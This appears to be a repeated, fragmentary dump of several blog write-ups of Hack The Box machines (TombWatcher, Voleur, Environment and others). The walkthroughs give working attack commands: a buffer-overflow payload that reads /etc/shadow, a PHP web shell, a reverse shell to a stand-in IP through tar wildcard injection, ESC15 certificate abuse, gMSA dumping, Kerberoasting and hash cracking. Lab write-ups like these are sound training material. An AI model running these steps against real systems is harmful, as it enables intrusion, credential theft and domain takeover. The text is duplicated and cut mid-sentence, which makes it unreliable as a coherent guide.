potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; 